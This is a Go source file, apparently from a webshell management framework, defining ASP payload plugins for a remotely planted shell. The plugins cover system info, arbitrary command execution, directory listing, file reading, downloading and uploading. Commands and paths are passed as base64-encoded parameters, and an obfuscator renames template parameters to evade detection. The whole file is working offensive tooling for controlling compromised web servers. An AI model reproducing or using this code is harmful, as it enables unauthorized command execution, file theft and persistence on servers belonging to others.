package asp

import (
	"context"
	"errors"
	"strings"

	"github.com/Yliken/redbeanshellcore/core"
)

type aspInfo struct{ obf *Obfuscator }

func NewAspInfo() *aspInfo { return &aspInfo{obf: DefaultObfuscator()} }
func (p *aspInfo) WithObfuscator(obf *Obfuscator) *aspInfo { p.obf = obf; return p }
func (p *aspInfo) Name() string { return "info" }
func (p *aspInfo) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *aspInfo) Build(_ context.Context, sess *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPTemplates{}
	code := tpl.Info()
	if p.obf != nil && p.obf != DefaultObfuscator() {
		code = templateSubst(code, p.obf)
	}
	req.Payload = []byte(code)
	req.Meta["adapter"] = "asp"
	_ = sess
	return req, nil
}

func (p *aspInfo) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspInfo.Parse: response is nil") }
	if err := parseRemoteError(p.Name(), resp); err != nil { return nil, err }
	return parseInfo(resp.Body), nil
}

type aspExec struct {
	cmd    string
	bin    string
	envars map[string]string
	obf    *Obfuscator
}

func NewAspExec(cmd string) *aspExec { return &aspExec{cmd: cmd, obf: DefaultObfuscator()} }
func (p *aspExec) WithObfuscator(obf *Obfuscator) *aspExec { p.obf = obf; return p }
func (p *aspExec) Name() string { return "exec" }
func (p *aspExec) RiskLevel() core.RiskLevel { return core.RiskExec }
func (p *aspExec) WithBin(bin string) *aspExec { p.bin = bin; return p }
func (p *aspExec) WithEnv(key, value string) *aspExec {
	if p.envars == nil { p.envars = make(map[string]string) }; p.envars[key] = value; return p
}

func (p *aspExec) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPTemplates{}
	code := tpl.Exec()
	if p.obf != nil && p.obf != DefaultObfuscator() {
		code = templateSubst(code, p.obf)
	}
	req.Payload = []byte(code)
	req.SetParam(p.obf.Param1(), []byte(b64(p.cmd)))
	req.Meta["adapter"] = "asp"
	return req, nil
}

func (p *aspExec) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspExec.Parse: response is nil") }
	if err := parseRemoteError(p.Name(), resp); err != nil { return nil, err }
	return parseExec(resp.Body), nil
}

type aspFileList struct{ target string; obf *Obfuscator }

func NewAspFileList(path string) *aspFileList {
	if path == "" { path = "/" }; return &aspFileList{target: path, obf: DefaultObfuscator()}
}
func (p *aspFileList) WithObfuscator(obf *Obfuscator) *aspFileList { p.obf = obf; return p }
func (p *aspFileList) Name() string { return "file.list" }
func (p *aspFileList) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *aspFileList) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPTemplates{}
	code := tpl.FileList()
	if p.obf != nil && p.obf != DefaultObfuscator() {
		code = templateSubst(code, p.obf)
	}
	req.Payload = []byte(code)
	req.SetParam(p.obf.Param1(), []byte(b64(p.target)))
	req.Meta["adapter"] = "asp"
	return req, nil
}

func (p *aspFileList) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspFileList.Parse: response is nil") }
	if err := parseRemoteError(p.Name(), resp); err != nil { return nil, err }
	return parseFileList(p.target, resp.Body), nil
}

type aspFileRead struct{ target string; obf *Obfuscator }

func NewAspFileRead(path string) *aspFileRead { return &aspFileRead{target: path, obf: DefaultObfuscator()} }
func (p *aspFileRead) WithObfuscator(obf *Obfuscator) *aspFileRead { p.obf = obf; return p }
func (p *aspFileRead) Name() string { return "file.read" }
func (p *aspFileRead) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *aspFileRead) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPTemplates{}
	code := tpl.FileRead()
	if p.obf != nil && p.obf != DefaultObfuscator() {
		code = templateSubst(code, p.obf)
	}
	req.Payload = []byte(code)
	req.SetParam(p.obf.Param1(), []byte(b64(p.target)))
	req.Meta["adapter"] = "asp"
	return req, nil
}

func (p *aspFileRead) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspFileRead.Parse: response is nil") }
	if err := parseRemoteError(p.Name(), resp); err != nil { return nil, err }
	return parseFileRead(p.Name(), p.target, resp.Body), nil
}

type aspFileDownload struct{ target string; obf *Obfuscator }

func NewAspFileDownload(path string) *aspFileDownload { return &aspFileDownload{target: path, obf: DefaultObfuscator()} }
func (p *aspFileDownload) WithObfuscator(obf *Obfuscator) *aspFileDownload { p.obf = obf; return p }
func (p *aspFileDownload) Name() string { return "file.download" }
func (p *aspFileDownload) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *aspFileDownload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPTemplates{}
	code := tpl.FileDownload()
	if p.obf != nil && p.obf != DefaultObfuscator() {
		code = templateSubst(code, p.obf)
	}
	req.Payload = []byte(code)
	req.SetParam(p.obf.Param1(), []byte(b64(p.target)))
	req.Meta["adapter"] = "asp"
	return req, nil
}

func (p *aspFileDownload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspFileDownload.Parse: response is nil") }
	if err := parseRemoteError(p.Name(), resp); err != nil { return nil, err }
	return parseFileRead(p.Name(), p.target, resp.Body), nil
}

type aspFileUpload struct {
	remote  string
	content []byte
	obf     *Obfuscator
}

func NewAspFileUpload(remotePath string, content []byte) *aspFileUpload {
	return &aspFileUpload{remote: remotePath, content: content, obf: DefaultObfuscator()}
}
func (p *aspFileUpload) WithObfuscator(obf *Obfuscator) *aspFileUpload { p.obf = obf; return p }
func (p *aspFileUpload) Name() string { return "file.upload" }
func (p *aspFileUpload) RiskLevel() core.RiskLevel { return core.RiskWrite }

func (p *aspFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPTemplates{}
	code := tpl.FileUpload()
	if p.obf != nil && p.obf != DefaultObfuscator() {
		code = templateSubst(code, p.obf)
	}
	req.Payload = []byte(code)
	req.SetParam(p.obf.Param1(), []byte(b64(p.remote)))
	req.SetParam(p.obf.Param2(), []byte(b64(string(p.content))))
	req.Meta["adapter"] = "asp"
	return req, nil
}

func (p *aspFileUpload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspFileUpload.Parse: response is nil") }
	trimmed := strings.TrimSpace(string(resp.Body))
	ok := trimmed == "1" || trimmed == "ok"
	return &core.BoolResult{BaseResult: core.NewBaseResult("file.upload", resp.Body), OK: ok, Message: trimmed}, nil
}

func b64(s string) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	if s == "" { return "" }
	var out []byte; b := []byte(s); n := len(b)
	for i := 0; i < n; i += 3 {
		var v, pad int
		switch {
		case i+2 < n: v = int(b[i])<<16 | int(b[i+1])<<8 | int(b[i+2])
		case i+1 < n: v = int(b[i])<<16 | int(b[i+1])<<8; pad = 1
		default: v = int(b[i]) << 16; pad = 2
		}
		out = append(out, chars[(v>>18)&63], chars[(v>>12)&63])
		if pad < 2 { out = append(out, chars[(v>>6)&63]) } else { out = append(out, '=') }
		if pad < 1 { out = append(out, chars[v&63]) } else { out = append(out, '=') }
	}
	return string(out)
}
